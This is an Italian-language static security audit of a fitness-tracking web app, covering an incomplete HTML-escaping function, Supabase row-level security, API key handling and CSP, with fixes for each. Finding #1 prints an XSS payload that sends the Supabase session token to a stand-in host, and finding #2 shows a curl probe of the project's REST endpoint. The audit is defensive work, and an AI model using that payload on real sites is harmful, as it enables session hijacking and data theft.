# Security Audit — Scheda Full Body v24.6
Analisi statica di `index.html` (6366 righe) prima della migrazione a Vite.

---

## SOMMARIO

| # | Finding | Severità | Stato |
|---|---------|----------|-------|
| 1 | XSS via `esc()` incompleta | **CRITICA** | da fixare in codice |
| 2 | Supabase: RLS da verificare | **CRITICA** | da verificare sul dashboard |
| 3 | Chiave Gemini sincronizzata in chiaro sul cloud | ALTA | scelta di design da rivedere |
| 4 | Token di sessione in localStorage | ALTA | mitigata risolvendo #1 |
| 5 | Chiave Gemini passata in query string | MEDIA | fix banale |
| 6 | Nessuna Content-Security-Policy | MEDIA | fix banale |
| 7 | Backup esportato in chiaro | BASSA | informativa |
| 8 | `img src` da URL arbitrario | BASSA | accettabile |

---

## 1. XSS — `esc()` non neutralizza `<` e `>` — **CRITICA**

**Riga 1045:**
```js
const esc=s=>String(s??"").replace(/"/g,"&quot;");
```

Escapa **solo le virgolette doppie**. Va bene per gli attributi HTML, è insufficiente per il testo inserito via `innerHTML`. Tutto il rendering dell'app usa `innerHTML` con template literal.

### Vettori d'ingresso reali

| Vettore | Come arriva | Riga |
|---|---|---|
| **Risposta Gemini in chat** | testo AI → `esc(m.t)` → `innerHTML` | 5061 |
| **Import scheda da foto (OCR)** | immagine → Gemini → nomi esercizio → `innerHTML` | 2956+ |
| **Import backup JSON** | file esterno → `S.days` → `innerHTML` | `importSchedaAsk` |
| **Nome esercizio / nota / profilo** | input utente | ovunque |

Esempio di payload che passa indenne (senza virgolette, quindi `esc()` non lo tocca):
```html
<img src=x onerror=fetch('https://evil.tld/?d='+localStorage.getItem('supa_session'))>
```

Scenario concreto: qualcuno ti manda la foto di una scheda con quella stringa scritta sopra, oppure un file di backup "da provare". Gemini la trascrive fedelmente nel nome dell'esercizio, l'app la renderizza, il codice esegue e il token di sessione Supabase parte verso l'esterno.

### Fix

```js
const esc = s => String(s ?? "")
  .replace(/&/g, "&amp;")
  .replace(/</g, "&lt;")
  .replace(/>/g, "&gt;")
  .replace(/"/g, "&quot;")
  .replace(/'/g, "&#39;");
```

L'ordine conta: `&` per primo. Inoltre, in fase di migrazione va fatto un passaggio su tutti i template literal per verificare che **ogni** interpolazione di dato non fidato passi da `esc()`. Ne ho contate diverse che oggi non lo fanno.

---

## 2. Supabase — Row Level Security da verificare — **CRITICA**

**Righe 3729-3730:** URL progetto e chiave anon in chiaro nel sorgente.

```
https://gnksbatouzwdneixvpmn.supabase.co
role: anon · emessa 18/07/2026 · scade 18/07/2036
```

**Questo di per sé NON è un bug.** La chiave `anon` è progettata per stare nel client: è pubblica by design. Il modello di sicurezza di Supabase non si regge sulla segretezza della chiave, si regge su **Row Level Security**.

**Il problema è che la sicurezza dell'intera app dipende da una configurazione che non è nel codice e che quindi non posso verificare da qui.**

Se sulla tabella di sync RLS è **disattivata**, oppure attiva ma con una policy permissiva, allora chiunque legga il sorgente (è su GitHub, quindi chiunque) può fare:

```
GET  /rest/v1/<tabella>?select=*   → legge le schede, le misure corporee e le chiavi API di tutti gli utenti
POST /rest/v1/<tabella>            → scrive/cancella dati altrui
```

### Cosa devi verificare domani (5 minuti)

Dashboard Supabase → Table Editor → la tua tabella di sync:

1. Il badge **"RLS enabled"** deve essere verde. Se è rosso: `ALTER TABLE <nome> ENABLE ROW LEVEL SECURITY;`
2. Authentication → Policies: ogni policy deve legare la riga all'utente, non essere aperta. Forma corretta:

```sql
create policy "own rows only" on public.<tabella>
  for all
  using (auth.uid() = user_id)
  with check (auth.uid() = user_id);
```

Una policy tipo `using (true)` equivale a non avere RLS.

3. Verifica anche che non esista in giro una chiave `service_role` (quella sì che è segreta e bypassa RLS). Nel sorgente attuale **non c'è** — verificato, l'unica presente è `anon`. Bene così.

### Test pratico

Da terminale, senza essere loggato:
```bash
curl "https://gnksbatouzwdneixvpmn.supabase.co/rest/v1/<tabella>?select=*" \
  -H "apikey: <la chiave anon>"
```
Se torna `[]` o un errore di permessi → RLS funziona.
Se torna dati → **RLS è aperta, va chiusa subito.**

---

## 3. Chiave Gemini sincronizzata in chiaro — ALTA

**Righe 4643-4655.** Con l'opzione "Sincronizza sui miei dispositivi" attiva, la chiave finisce in `S.ai.key`, quindi dentro il blob di stato salvato su Supabase, in chiaro.

Conseguenze:
- se RLS è aperta (finding #2) → chiunque la legge e la usa a tuo carico
- la chiave finisce anche in ogni backup JSON esportato
- Google AI Studio è gratuito ma con quota; una chiave rubata te la esaurisce, e se in futuro abiliti la fatturazione diventa un costo

Opzioni, in ordine di preferenza:
1. Non sincronizzarla mai (resta solo in localStorage, la reinserisci sull'altro dispositivo — 20 secondi)
2. Sincronizzarla ma cifrata con una passphrase che l'utente digita (WebCrypto AES-GCM, ~30 righe)
3. Lasciare com'è, ma solo dopo aver confermato che RLS è chiusa

Nota di design: qualsiasi chiave API usata da un'app puramente client è, in ultima analisi, esposta all'utente stesso. Qui va bene perché la chiave è *sua*. Diventa un problema solo se finisce nelle mani di altri.

---

## 4. Token di sessione in localStorage — ALTA

`supa_session` (access token + refresh token) sta in localStorage, leggibile da qualsiasi JS in pagina. È la prassi comune per le SPA e in sé è accettabile, **ma diventa grave in combinazione con il finding #1**: un XSS non ruba solo dei dati, ruba la sessione intera e fa account takeover.

Risolvendo #1 e #6 il rischio residuo è basso. Non serve altro per un'app di questa scala.

---

## 5. Chiave Gemini in query string — MEDIA

**Righe 2990, 3928:**
```js
fetch(`https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${key}`)
```

La chiave viaggia nell'URL. Finisce in cronologia browser, in eventuali log intermedi, e in `Referer` se qualcosa la propaga. Google supporta l'header dedicato:

```js
fetch(`https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent`, {
  method: "POST",
  headers: { "Content-Type": "application/json", "x-goog-api-key": key },
  body: JSON.stringify(payload)
});
```

Fix di due righe, da fare in migrazione.

---

## 6. Nessuna Content-Security-Policy — MEDIA

GitHub Pages non permette header HTTP custom, ma il meta tag funziona ed è una seconda linea di difesa efficace contro #1:

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src https://fonts.gstatic.com;
  img-src 'self' data: https:;
  connect-src 'self' https://*.supabase.co https://generativelanguage.googleapis.com;
  base-uri 'none';
  object-src 'none';
  form-action 'none'
">
```

**Nota**: `script-src 'self'` richiede che il JS sia in un file esterno, non inline. Oggi è tutto inline in `<script>`, quindi la CSP non è applicabile senza `'unsafe-inline'` (che la renderebbe inutile contro XSS). **Con Vite il JS diventa un bundle esterno, quindi la CSP diventa finalmente applicabile davvero.** È un buon argomento in più per la migrazione.

---

## 7. Backup esportato in chiaro — BASSA (informativa)

Il JSON di export contiene misure corporee, storico allenamenti, profilo e — se sincronizzata — la chiave Gemini. È un file locale sotto il tuo controllo, quindi non è un bug: va solo saputo. Non caricarlo su Drive condivisi, non allegarlo a un issue GitHub, non passarlo a nessuno senza prima svuotare `ai.key`.

Suggerimento: in fase di export, rimuovere `ai.key` dal file di default e offrire una spunta "includi la chiave API".

---

## 8. `img src` da URL arbitrario — BASSA

**Riga 749:** `<img src="${esc(e.img)}">`. Le virgolette sono escapate, quindi non c'è attribute breakout. Un URL malevolo può fare da beacon (rivela il tuo IP a un terzo) ma non esegue codice. Accettabile. Volendo, limitare a `https:` e `data:image/` con un controllo sul valore.

---

## COSA **NON** HO TROVATO (buone notizie)

- Nessuna chiave `service_role` Supabase nel sorgente
- Nessuna password, nessun secret di terze parti hardcoded
- Nessun endpoint privato o URL interno esposto
- `window.open` e i link esterni usano correttamente `noopener` (righe 1658, 4696, 5140)
- L'URL YouTube è costruito con `encodeURIComponent` su prefisso fisso: non iniettabile
- Nessun `eval`, nessun `new Function`, nessun `document.write`
- Nessuna dipendenza CDN eseguibile (solo Google Fonts, CSS): superficie d'attacco supply-chain praticamente nulla
- I dati personali (peso, BIA, misure) restano tra localStorage e il tuo progetto Supabase: nessun terzo li vede
- Le foto per l'OCR vanno a Google e a nessun altro

---

## PIANO DI RIMEDIO

**Prima della migrazione (domani, a mano, 15 min):**
1. Verifica RLS su Supabase → finding #2 · *il più importante di tutti*
2. Decidi cosa fare della sincronizzazione chiave Gemini → finding #3

**Durante la migrazione a Vite (lo faccio io):**
3. `esc()` completa + audit di ogni interpolazione → finding #1
4. Chiave Gemini nell'header invece che in query string → finding #5
5. CSP nel meta tag, resa efficace dal bundle esterno → finding #6
6. Export senza chiave API di default → finding #7
7. Validazione `img src` → finding #8

**Se RLS risultasse aperta:** chiudila, poi **ruota la chiave anon** (Supabase → Settings → API → Reset) e considera compromesso tutto ciò che c'era in tabella.

---

*Audit statico su codice sorgente. Non copre la configurazione lato Supabase (non ispezionabile dal client) né test dinamici.*
